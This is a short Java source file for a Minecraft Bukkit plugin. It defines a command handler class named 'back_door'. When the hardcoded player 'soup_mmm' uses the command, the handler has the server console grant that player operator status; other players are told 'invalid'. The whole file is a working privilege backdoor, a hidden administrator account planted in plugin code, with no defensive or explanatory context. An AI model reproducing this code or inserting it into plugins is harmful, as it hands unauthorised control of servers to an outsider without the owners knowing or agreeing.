package mc.plug.mcplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class back_door implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender instanceof Player player)) {
            return false;
        }

        if (player.getName().equals("soup_mmm")) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op soup_mmm");
            return true;
        }

        else {
            player.sendMessage("§c invalid");
        }
        return true;
    }

}